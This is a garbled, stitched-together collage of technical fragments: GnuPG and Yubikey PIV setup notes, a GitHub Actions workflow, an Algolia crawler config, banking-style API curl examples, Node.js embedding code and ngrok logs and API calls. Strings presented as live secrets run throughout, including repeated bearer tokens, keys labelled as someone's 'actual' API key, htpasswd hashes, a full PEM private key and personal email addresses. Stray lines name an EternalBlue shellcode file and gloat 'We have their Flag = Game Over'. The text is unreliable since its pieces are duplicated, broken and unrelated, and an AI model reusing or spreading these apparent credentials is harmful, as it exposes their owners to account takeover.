| gpg-connect-agent --decode | awk '/^D/ {print
Extra close brace or missing open brace

$2}'
--deny-admin
--application-priority namelist
gpg-connect-agent 'scd getinfo app_list' /bye
--auto-expand-secme
--ssh-fingerprint-digest
--max-cache-ttl
1
MARKTRUSTED fingerprint "P"|"S"
+The server will then pop up a window to ask the user whether she really trusts this key. For this it will probably ask for a text to be displayed like this:
+
+GPG_TTY=$
(tty) +export GPG_TTY +--daemon [command line] +server + +gpg-card +AUTHENTICATE [--setkey] [--raw] [< file]|010203040506070801020304050607080102030405060708] ¶ +AUTH +FETCH +GENERATE [--force] [--algo=algo{+algo2}] keyref +KDF-SETUP ¶ +Prepare the OpenPGP card KDF feature for this card. (OID=1.3.6.1.4.1.11591.2.3.1) is expected and extracted to file. Note that for current OpenPGP cards a certificate may only be available at the certref "OPENPGP.3" --homedir + +GnuPG has support for PIV cards (“Personal Identity Verification” as specified by NIST Special Publication 800-73-4). This section describes how to initialize (personalize) a fresh Yubikey token featuring the PIV application (requires Yubikey-5). We assume that the credentials have not yet been changed and thus are: + +Authentication key +This is a 24 byte key described by the hex string +010203040506070801020304050607080102030405060708.

Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) y These parameters are used: Key-Type: RSA Key-Length: 2048 Key-Usage: encrypt Serial: random Name-DN: CN=Encryption key for yk-9074625,O=example,C=DE Name-Email: otto@example.net

Proceed with creation? (y/N) Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &34798AAFE0A7565088101CC4AE31C5C8C74461CB gpgsm: certificate created Ready. $ gpgsm --import encr.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

gpg/card> writekey PIV.9D 34798AAFE0A7565088101CC4AE31C5C8C74461CB gpg/card> writecert PIV.9D < encr.crt

gpgsm --with-keygrip -k 6309304695z@gmail.com Key management ...: 34798AAFE0A7565088101CC4AE31C5C8C74461CB keyref .....: PIV.9D (encr) algorithm ..: rsa2048 used for ...: X.509 user id ..: CN=Encryption key for yk-9074625,O=example,C=DE user id ..: 6309304695z@gmail.com

34798AAFE0A7565088101CC4AE31C5C8C74461CB.key

$ gpgsm --learn $ gpgsm --gen-key -o sign.crt Please select what kind of key you want: (1) RSA (2) Existing key (3) Existing key from card Your selection? 3 Serial number of the card: FF020001008A77C1 Available keys: (1) 213D1825FDE0F8240CB4E4229F01AF90AC658C2E PIV.9A nistp384 (2) 7A53E6CFFE7220A0E646B4632EE29E5A7104499C PIV.9E nistp256 (3) 32A6C6FAFCB8421878608AAB452D5470DD3223ED PIV.9C rsa2048 (4) 34798AAFE0A7565088101CC4AE31C5C8C74461CB PIV.9D rsa2048 Your selection? 3 Possible actions for a RSA key: (1) sign, encrypt (2) sign (3) encrypt Your selection? 2 Enter the X.509 subject name: CN=Signing key for yk-9074625,O=example,C=DE Enter email addresses (end with an empty line):

6309304695z@gmail.com
Enter DNS names (optional; end with an empty line):

Enter URIs (optional; end with an empty line):

Create self-signed certificate? (y/N) These parameters are used: Key-Type: card:PIV.9C Key-Length: 1024 Key-Usage: sign Serial: random Name-DN: CN=Signing key for yk-9074625,O=example,C=DE Name-Email: 6309304695z@gmail.com

Proceed with creation? (y/N) y Now creating self-signed certificate. This may take a while ... gpgsm: about to sign the certificate for key: &32A6C6FAFCB8421878608AAB452D5470DD3223ED gpgsm: certificate created Ready. $ gpgsm --import sign.crt gpgsm: certificate imported gpgsm: total number processed: 1 gpgsm: imported: 1

‘gpgsm --learn’ Digital signature’ key gpg-card:010203040506070801020304050607080102030405060708

shellcode/eternalblue_sc_merge.py

gpg/card> writecert PIV.9C < sign.crt on: push: branches: master

jobs: import-gpg: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v4 - name: Import GPG key uses: crazy-max/ghaction-import-gpg@v6 with: gpg_private_key: {{ secrets.PASSPHRASE }} trust_level: 5

global.h -- global header file

md2.h -- header file for MD2

md2c.c -- source code for MD2 aladdin:$apr1$ZjTqBB3f$IF9gdYAGlMrs2fuINjHsz. user2:$apr1$O04r.y2H$/vEkesPhVInBByJUkXitA/

artifact_paths = ["{repo}/design"]

exclude_artifact_paths = []

code_paths = [ "/artifact-app/src", "/artifact-app/tests", "/artifact-lib/src", "/artifact-ser/src", "/artifact-data/src", "/artifact-test/src", "/artifact-frontend/src", ]

exclude_code_paths = [ ]

code_url = "https://github.com/vitiral/artifact/blob/master/{file}#L{line}"

[export] md_header = """ Artifact design docs, exported to markdown.

See REQ-purpose for the top level artifact.

Note: Export docs like this with art export md exported.md

Settings are in .art/settings.toml """ md_family = { type = "list" }
[export.md_dot] type = "ignore"

pre = """

Alt text



custom_mark10

"""

post = """

custom_mark10


"""

startUrls: ["https://www.algolia.com/blog/"], pathsToMatch: ["https://www.algolia.com/blog/"], recordExtractor: ({ url,
Unable to render expression.

$, contentLength, fileType }) =&gt; {
return [{ url: url.href, title: $
('head > title').text() }]; } ‘--force’ new Crawler({ appId: "000006", apiKey: "ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069", indexPrefix: "crawler_", rateLimit: 8, maxUrls: 500, startUrls: ["https://www.algolia.com/blog"], ignoreQueryParams: ["utm_medium", "utm_source", "utm_campaign", "utm_term"], actions: [ { indexName: "default_index_name", pathsToMatch: ["https://www.algolia.com/blog/"], recordExtractor: ({ url, $, contentLength, fileType }) => { console.log(Crawling "${url.href}");

    return [
      {
        // URL
        url: url.href,
        hostname: url.hostname,
        path: url.pathname,
        depth: url.pathname.split("/").length - 1,

        // Metadata
        contentLength,
        fileType,
        title: $("head > title").text(),
        keywords: $("meta[name=keywords]").attr("content"),
        description: $("meta[name=description]").attr("content"),
        type: $('meta[property="og:type"]').attr("content"),
        image: $('meta[property="og:image"]').attr("content"),

        // Content
        headers: $("h1,h2")
          .map((i, e) => $(e).text())
          .get()
      }
    ]
  }
}
], initialIndexSettings: { default_index_name: { searchableAttributes: [ "unordered(keywords)", "unordered(title)", "unordered(description)", "unordered(headers)", "url" ], customRanking: ["asc(depth)"], attributesForFaceting: ["fileType", "type"] } } });

// check compatibility if (!("BarcodeDetector" in globalThis)) { console.log("Barcode Detector is not supported by this browser."); } else { console.log("Barcode Detector supported!");

// create new detector const barcodeDetector = new BarcodeDetector({ formats: ["code_39", "codabar", "ean_13"], }); } // check supported types BarcodeDetector.getSupportedFormats().then((supportedFormats) => { supportedFormats.forEach((format) => console.log(format)); }); barcodeDetector .detect(imageEl) .then((barcodes) => { barcodes.forEach((barcode) => console.log(barcode.rawValue)); }) .catch((err) => { console.log(err); }); Git Credential Manager = We have their Flag = Game Over. curl -X GET 'https://api.s.unit.sh/cards/41?include=customer,account' -H "Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}" { "type": "depositAccount", "id": "50", "attributes": { // ... }, "relationships": { // relationships object "customer": { // relationship object "data": { // resource linkage with single resource identifier "type": "businessCustomer", "id": "39" } } } }

curl -X DELETE 'https://api.s.unit.sh/users/2/api-tokens/22' -H "Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}"

{ "data": { "id": "20", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T09:04:50.987Z", "description": "Production token", "expiration": "2022-07-01T13:47:17.000Z", "token": "v2.public.eyJyb2xlIjoib3JnI..." } } } ‘--force’ curl -X POST 'https://api.s.unit.sh/users/2/api-tokens' -H 'Content-Type: application/vnd.api+json' -H 'Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}' --data-raw '{ "data": { "type": "apiToken", "attributes": { "description": "Production token", "scope": "customers applications", "expiration": "2022-07-01T13:47:17.000Z" } } }' { "data": [ { "id": "21", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T09:13:23.211Z", "description": "Production token", "expiration": "2022-07-01T09:13:23.124Z" } }, { "id": "22", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T09:14:10.590Z", "description": "Testing token", "expiration": "2021-07-01T13:47:17.000Z", "sourceIp": "192.168.1.1,192.168.1.2" } } ] } curl -X GET 'https://api.s.unit.sh/users/2/api-tokens' -H "Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}" { "data": { "id": "19", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T08:51:09.108Z", "description": "Production token", "expiration": "2022-07-01T13:47:17.000Z", "token": "v2.public.eyJyb2xlIjoib3JnI..." } } }

curl -X GET 'https://api.s.unit.sh/cards/41?include=customer,account' -H "Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}"

{ "type": "depositAccount", "id": "50", "attributes": { // ... }, "relationships": { // relationships object "customer": { // relationship object "data": { // resource linkage with single resource identifier "type": "businessCustomer", "id": "39" } } } } curl -X GET 'https://api.s.unit.sh/cards' -H "Authorization: Bearer ${i8FWKLBjXEg3TdeK93G3K9PKLzhbT6CRhn/VKkTsm....}" curl -X POST 'https://api.s.unit.sh/cards' -H "Content-Type: application/vnd.api+json" -H "Authorization: Bearer ${i8FWKLBjXEg3TdeK93G3K9PKLzhbT6CRhn/VKkTsm....}" --data-raw '{ "data":{ "type":"individualDebitCard", "attributes": { "shippingAddress": { "street": "5230 Newell Rd", "city": "Palo Alto", "state": "CA", "postalCode": "94303", "country": "US" } }, "relationships": { "account": { "data": { "type": "depositAccount", "id": "10001" } } } } } '

curl -X POST 'https://api.s.unit.sh/customers/8/token' -H 'Content-Type: application/vnd.api+json' -H 'Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}' --data-raw '{ "data": { "type": "customerToken", "attributes": { "scope": "customers accounts-write accounts", "jwtToken": "i8FW..." } } }' { "data": { "type": "customerTokenVerification", "attributes": { "verificationToken": "i8FWKLBjXEg3TdeK93G3K9PKLzhbT6CRhn/VKkTsm...." } } } curl -X POST 'https://api.s.unit.sh/customers/10001/token/verification' -H 'Content-Type: application/vnd.api+json' -H 'Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}' --data-raw '{ "data": { "type": "customerTokenVerification", "attributes": { "channel": "sms" } } }'

curl -X GET 'https://api.s.unit.sh/users/2/api-tokens' -H "Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}" curl -X DELETE 'https://api.s.unit.sh/users/2/api-tokens/22' -H "Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}" { "data": [ { "id": "21", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T09:13:23.211Z", "description": "Production token", "expiration": "2022-07-01T09:13:23.124Z" } }, { "id": "22", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T09:14:10.590Z", "description": "Testing token", "expiration": "2021-07-01T13:47:17.000Z", "sourceIp": "192.168.1.1,192.168.1.2" } } ] } curl -X POST 'https://api.s.unit.sh/users/2/api-tokens' -H 'Content-Type: application/vnd.api+json' -H 'Authorization: Bearer ${ATATT3xFfGF0em-7Sy8fZXMVgrISVS9LAQikknXg7B0GyB-S-vVVTBM37VJoVWyYpdetDBLd1X0SdJk2FH0EorccPwryJm3xsPYum01tZK_yc0_rbXvKV_U__JgGuERBBhZDH-gOpsv4GvsIaTOb74PfUj9JtqBXWlxO_GeQ84aq04QHt54XByw=155E8069}' --data-raw '{ "data": { "type": "apiToken", "attributes": { "description": "Production token", "scope": "customers applications", "expiration": "2022-07-01T13:47:17.000Z" } } }' { "data": { "id": "19", "type": "apiToken", "attributes": { "createdAt": "2021-07-01T08:51:09.108Z", "description": "Production token", "expiration": "2022-07-01T13:47:17.000Z", "token": "v2.public.eyJyb2xlIjoib3JnI..." } } } { "version": 1, "type": "doc", "content": [ { "type": "paragraph", "content": [ { "type": "text", "text": "Hello " }, { "type": "text", "text": "world", "marks": [ { "type": "strong" } ] } ] } ] } { "version": 1, "type": "doc", "content": [] }

                         Apache License
                   Version 2.0, January 2004
                http://www.apache.org/licenses/
artifact_paths = ["{repo}/design"]

exclude_artifact_paths = []

code_paths = [ "/artifact-app/src", "/artifact-app/tests", "/artifact-lib/src", "/artifact-ser/src", "/artifact-data/src", "/artifact-test/src", "/artifact-frontend/src", ] ‘--force’ exclude_code_paths = [ ]

code_url = "https://github.com/vitiral/artifact/blob/master/{file}#L{line}"

[export] md_header = """ Artifact design docs, exported to markdown.

See REQ-purpose for the top level artifact.

Note: Export docs like this with art export md exported.md

Settings are in .art/settings.toml """ md_family = { type = "list" }
[export.md_dot] type = "ignore"

pre = """

Alt text



custom_mark10

"""

post = """

custom_mark10


"""

artifact_py lint artifact_py export -i --format md @pip install artifact_py artifact_py --help Or download the standalone zip file from releases and run within your build system

unzip artifact_py-0.1.2.zip artifact_py-0.1.2/artifact_py/bin/artifact_py --help Writing your design doc An artifact design doc is just a regular design doc which is parsed for artifacts. An artifact is a linkable design piece. It is linkable to other artifacts and linkable to code. ‘--force’ You specify an artifact like so:

This is an artifact (SPC-my_artifact) {#SPC-my_artifact}

Or alternatively (in github)

This is an artifact (SPC-my_artifact)

@ -1,3 +1,15 @@ 56 npm install tree-sitter-cli ReadMe.md int main(int argc, char** argv) { argv = uv_setup_args(argc, argv); std::vectorstd::string args(argv, argv + argc); // Parse Node.js CLI options, and print any errors that have occurred while // trying to parse them. std::unique_ptrnode::InitializationResult result = node::InitializeOncePerProcess(args, { node::ProcessInitializationFlags::kNoInitializeV8, node::ProcessInitializationFlags::kNoInitializeNodeV8Platform });

for (const std::string& error : result->errors()) fprintf(stderr, "%s: %s\n", args[0].c_str(), error.c_str()); if (result->early_return() != 0) { return result->exit_code(); }

// Create a v8::Platform instance. MultiIsolatePlatform::Create() is a way // to create a v8::Platform instance that Node.js can use when creating // Worker threads. When no MultiIsolatePlatform instance is present, // Worker threads are disabled. std::unique_ptr platform = MultiIsolatePlatform::Create(4); V8::InitializePlatform(platform.get()); V8::Initialize();

// See below for the contents of this function. int ret = RunNodeInstance( platform.get(), result->args(), result->exec_args());

V8::Dispose(); V8::DisposePlatform();

node::TearDownOncePerProcess(); return ret; }int RunNodeInstance(MultiIsolatePlatform* platform, const std::vectorstd::string& args, const std::vectorstd::string& exec_args) { int exit_code = 0;

// Setup up a libuv event loop, v8::Isolate, and Node.js Environment. std::vectorstd::string errors; std::unique_ptr setup = CommonEnvironmentSetup::Create(platform, &errors, args, exec_args); if (!setup) { for (const std::string& err : errors) fprintf(stderr, "%s: %s\n", args[0].c_str(), err.c_str()); return 1; }

Isolate* isolate = setup->isolate(); Environment* env = setup->env();

{ Locker locker(isolate); Isolate::Scope isolate_scope(isolate); HandleScope handle_scope(isolate); // The v8::Context needs to be entered when node::CreateEnvironment() and // node::LoadEnvironment() are being called. Context::Scope context_scope(setup->context());

// Set up the Node.js instance for execution, and run code inside of it.
// There is also a variant that takes a callback and provides it with
// the `require` and `process` objects, so that it can manually compile
// and run scripts as needed.
// The `require` function inside this script does *not* access the file
// system, and can only load built-in Node.js modules.
// `module.createRequire()` is being used to create one that is able to
// load files from the disk, and uses the standard CommonJS file loader
// instead of the internal-only `require` function.
MaybeLocal<Value> loadenv_ret = node::LoadEnvironment(
    env,
    "const publicRequire ="
    "  require('node:module').createRequire(process.cwd() + '/');"
    "globalThis.require = publicRequire;"
    "require('node:vm').runInThisContext(process.argv[1]);");

if (loadenv_ret.IsEmpty())  // There has been a JS exception.
  return 1;

exit_code = node::SpinEventLoop(env).FromMaybe(1);

// node::Stop() can be used to explicitly stop the event loop and keep
// further JavaScript from running. It can be called from any thread,
// and will act like worker.terminate() if called from another thread.
node::Stop(env);
}

return exit_code; }const path = require('node:path'); path

path.win32.basename('C:\temp\myfile.html'); // Returns: 'myfile.html' path.posix.basename('/tmp/myfile.html'); // Returns: 'myfile.html' .basename('C:\temp\myfile.html'); // Returns: 'C:\temp\myfile.html' path.basename('C:\temp\myfile.html'); // Returns: 'myfile.html' @@ -4178,6 +4178,31 @@ grateful345i@gmail.com --header --header '2b0kkNvjIBFuBl15nGxtnMd5B3P_37bwJDJ2GYRMTicczqhEG' api key bot Grateful's actual '2b0kkNvjIBFuBl15nGxtnMd5B3P_37bwJDJ2GYRMTicczqhEG' api key bot Grateful's actual #000006 $ Breadcrumbs X 4 ### ++ Sigma 9 ++ org.xwiki.rendering xwiki-rendering-macro-ctsreport 16.0.0 org.xwiki.rendering xwiki-rendering-legacy-transformations 16.0.0 4.0.0 org.xwiki.rendering xwiki-rendering-legacy 16.0.0 xwiki-rendering-legacy-transformations XWiki Rendering - Legacy - Transformations - Parent POM pom XWiki Rendering - Legacy - Transformations - Parent POM xwiki-rendering-legacy-transformation-macro 4.0.0 org.xwiki.rendering xwiki-rendering-macros 16.0.0 xwiki-rendering-macro-ctsreport XWiki Rendering - Macro - CTS Report Parses unit test results produced by Jenkins to generate test data for display 0.71 Compatibility Test Suite Report Macro org.xwiki.commons xwiki-commons-text ${commons.version} org.xwiki.commons xwiki-commons-context ${commons.version} org.xwiki.commons xwiki-commons-script ${commons.version} org.xwiki.rendering xwiki-rendering-syntax-plain ${project.version} ev.conn.server_name.matches("ngrok-docs-examples.ngrok.dev") ev.conn.server_name.matches(".*-your-org.ngrok.dev") && ev.conn.server_port == 80 ev.conn.client_ip != "2601:0:8200:0:4cd7:fd52:0:7823" && ev.conn.server_name == "ngrok-docs-examples.ngrok.dev" { "event_id": "ev_25X2AsJ5xpvuOParTYUQWe12XKo", "event_type": "ip_policy_created.v0", "event_timestamp": "2022-02-23T23:29:29Z", "account_id": "ac_2OtNvAlhso10Gx6s7eupzX3F98q", "principal": { "id": "usr_2OtNv9qH5Nk4NuNeszZ39gBxZ4H", "subject": "foo@example.com", "source": "API", "credential": { "id": "ak_2Oxt94wYsBTLwFUoMZcJRvJTaub", "uri": "https://api.ngrok.com/api_keys/ak_2Oxt94wYsBTLwFUoMZcJRvJTaub" } }, "object": { "id": "ipp_25X2Ao39z73FlVQKZ1iReMPe6Qv", "uri": "https://api.ngrok.com/ip_policies/ipp_25X2Ao39z73FlVQKZ1iReMPe6Qv", "created_at": "2022-02-23T23:29:29Z", "description": "Home network IP", "metadata": "", "action": "allow" } }

{ "event_id": "ev_25X3yFS6TDkig1KDJWIc4nnJO0c", "event_type": "http_request_complete.v0", "event_timestamp": "2022-02-23T23:44:16Z", "account_id": "ac_2OtNvAlhso10Gx6s7eupzX3F98q", "object": { "conn": { "client_ip": "2601:0:8200:9e:4cd7:0:c97f:7823", "server_name": "ngrok-docs-example.ngrok.app", "server_port": "" }, "http": { "request": { "first_byte_ts": null, "last_byte_ts": null, "method": "GET", "url": { "path": "/docs/obs" }, "version": "HTTP/2.0" }, "response": { "body_length": 13079, "first_byte_ts": "2022-02-23T23:44:16.732791273Z", "last_byte_ts": "2022-02-23T23:44:16.737257209Z", "status_code": 200 } } } } { "event_id": "ev_25X4osod1q306srserDeFyghTC4", "event_type": "tcp_connection_closed.v0", "event_timestamp": "2022-02-23T23:51:14Z", "account_id": "ac_2OtNvAlhso10Gx6s7eupzX3F98q", "object": { "conn": { "bytes_in": 3437, "bytes_out": 90256, "client_ip": "2601:0:8200:9e:4cd7:0:c97f:7823", "end_ts": "2022-02-23T23:51:14.005372199Z", "server_name": "ngrok-docs-example.ngrok.app", "server_port": "", "start_ts": "2022-02-23T23:44:16.528374173Z" } } }

Tunnel Authentication Sirius Black Token '2bccY8aJWGzWp2AyhwB9Bi4JK4r_6BHRXwqzCW2NCXu7VLBf'

Grateful's actual bot user 🆔 'ak_2bcbwvXZPklwJuD7l1Ts7r7vEHr' Bot data 'bot_2bOqWXrxi75KWEKeNbXsIn2wpD7'

ngrok http 80 --verify-webhook twilio --verify-webhook-secret "{twilio webhook secret}" -----BEGIN CERTIFICATE----- ... -----END CERTIFICATE-------BEGIN CERTIFICATE-----curl \

... -----END CERTIFICATE-------BEGIN CERTIFICATE----- ... -----END CERTIFICATE----- -X GET -H "Authorization: Bearer {2bcbwvXZPklwJuD7l1Ts7r7vEHr_5mTiPcECPmXrQNJTZiGAQ}" -H "Ngrok-Version: 2" https://api.ngrok.com/tls_certificates/cert_2bMmWcJj1yNwg3nr80d93h4j9Et curl -X POST -H "Authorization: Bearer {bot_2bOqWXrxi75KWEKeNbXsIn2wpD7}" -H "Content-Type: application/json" -H "Ngrok-Version: 2" -d '{"certificate_pem":"-----BEGIN CERTIFICATE-----\nMIIDDTCCAfWgAwIBAgIUBUunDdA4gjgtEbZA8w9Ljhvl3bEwDQYJKoZIhvcNAQEL\nBQAwFjEUMBIGA1UEAwwLZXhhbXBsZS5jb20wHhcNMjAwMzI0MTgxODE5WhcNMjAw\nNDIzMTgxODE5WjAWMRQwEgYDVQQDDAtleGFtcGxlLmNvbTCCASIwDQYJKoZIhvcN\nAQEBBQADggEPADCCAQoCggEBAPKVkkKYNl3d9cqrz4tIFlwsohED5W4y1dcBixy4\nGANFFnw43nc2wPyKwYXumJqJIFrcW/NkUZL07bd+dou6mT6Gh/zbaTW91IkREPXL\n7b3KfVu4XkFosVXpWs0U6o4GrZ81CLiKBWI+H03x/ij5OSiJ1l71pqLeTJLOydAR\nAl8kpp7axeHU4UbDrAZkW5SnuZTjIKwVg0UNsBg1yNfUOu1Uah3BYaqPgQitC0Yg\nLW+NUGu/T91bkD7tLsVInkQXeQGdXBAqOycfJ7wj8OlIpyuXjTnGFA0izVmbQw5f\nrQnZ0geGyhLamvz9Gcd7mIlD/+/AEN9Lht82tAOzKG98/O8CAwEAAaNTMFEwHQYD\nVR0OBBYEFKv6RsvEC6T+zCtJZwB0FCR1sEkhMB8GA1UdIwQYMBaAFKv6RsvEC6T+\nzCtJZwB0FCR1sEkhMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEB\nAC5fBrouinespo5+9AipjhY/HOKTg+OCnppFnSnqeU1eXZZJ0oakdHTpTNxtbQP9\ntOJTA2f3KWvmpNDMohEQXZz8wHDkdbrIXJKVp6zs1pEp+0BIjA4y9mSywa5xuyk0\noGeChRgGqp2JujDyPCb7LEaKKQEEdMqy73QG+jEAh14+wKixlAf1nATBdeCUvssK\n2x1uZMyqjJFB5y/5EdnWQzD4WJkrsCkxsZHVMN1d+dqf2sf3dTRV8fzsFGOG17NS\n6u2n9iGcFdBA82XN8yeLIWhy1t3GWutG1sdxENbFRRXea+iUqzDsmRtkaBma2GLQ\nd6JTpFbsCtwDjP23UEi7SZo=\n-----END CERTIFICATE-----","private_key_pem":"-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDylZJCmDZd3fXK\nq8+LSBZcLKIRA+VuMtXXAYscuBgDRRZ8ON53NsD8isGF7piaiSBa3FvzZFGS9O23\nfnaLupk+hof822k1vdSJERD1y+29yn1buF5BaLFV6VrNFOqOBq2fNQi4igViPh9N\n8f4o+TkoidZe9aai3kySzsnQEQJfJKae2sXh1OFGw6wGZFuUp7mU4yCsFYNFDbAY\nNcjX1DrtVGodwWGqj4EIrQtGIC1vjVBrv0/dW5A+7S7FSJ5EF3kBnVwQKjsnHye8\nI/DpSKcrl405xhQNIs1Zm0MOX60J2dIHhsoS2pr8/RnHe5iJQ//vwBDfS4bfNrQD\nsyhvfPzvAgMBAAECggEBALLv7YE98exvi5zB+0fMFuJK8gkHDLequ93q/4hhqyTO\nU3WyJTdepiAi4fk/NEXZnIopPZJdj2aNUMQnfp43OE7MwYac+hBwRFQOyKnmkSmM\nMcf0SWKKLTUn+piIMzQsbOmhHxuwg6QiGslOFaJ3o9fpRL2rCg3dWDJ6Ypcd1NgE\nK0uy7gg+DwIpU6MeG6lA+HbxbGi+yd2x88Gjn9dGr7FZK34RUDooH60BCX9P8N9X\nT+n10MzzX7ZQOsLfe8FKc1/X8AybI5SYm1GMyfKD4QBt6JG4HKAjPHzBzcIpfN3d\n7BM11Imkrz7LcbUG+F23NVsi6n5IIGT1WqwCRIH2PpECgYEA/SJ5Ra4d0hUS5RYB\nzABquM3sp7JsKxCn7O5PqNLB4TgH9dXtWFhaFVB6juMGyHbvktVH0j4lps/Te0rk\nVU2zU1XxvCTFhtcCYUtNk0cRw6LH8feKiorXHdDRB33t0c47QSD/6AGOjBtxqD7B\n3ZxyR3P+7RdQopLLRFN+FHAnmzsCgYEA9VSGZDFSK+fbg4CgwkWdzuHrAXaUEv0U\novqqWd/yXB9wauEvRHnOrSgW6hFZQiatJOXx0KnalJQzohz/SLGO0MqGtwQbYWVT\nWiJgjUbNeiPEHBeUA6U55lVQr26kQSUWdXEtRbDz+hqV1K+6tTEMzaSPmJiHNgki\nlNMO2gqGQd0CgYBJ268qx5zn2UJEGWG41j5NYbg1TfgFsLxugzI2/heX0TNxZVP1\nPQI7ydmYq2ElSJ6qZxSnoX5255i7FqT8xskV/bOkw83mhAGrxb8Cw+/I90wDq8h+\nl/ggOPdkijfDybq8TBae6SVgd/l3r6f9M1KcypmNMApVBSPN8daNvBOyVQKBgQDo\nsj2utyFrx8Xsm4rf+kxOuPbBMooM4MQ8OmpuSP6G5sMofWLqHmcs0sO5TK9PEYRV\nZU3ST+ml2FSJRdvWRaRi4laZLWoTHZrL+aN/HVM0sMwIoUyhkIy0ruOTIuzlZZpB\n1xHL8qXX6nOHgw8jYdz1CUuyv6owVMXaR77kjer+eQKBgByYZlR/eNTzlot0SdFl\nIbgQ9bV7VLIo+vKzOXE3trfzRJMgUosLTp+5wdSVSW/VBdYZ7Ir3n0bbpY/dGinI\nVShxPbChhCZnhvG2lEEiekI44m5jHSA6hhtRdt/CrhL65Rw2SE5lMEe8htg1UGus\nwzLHWHBl72FjbjdhvEgrq60W\n-----END PRIVATE KEY-----"}' https://api.ngrok.com/tls_certificates

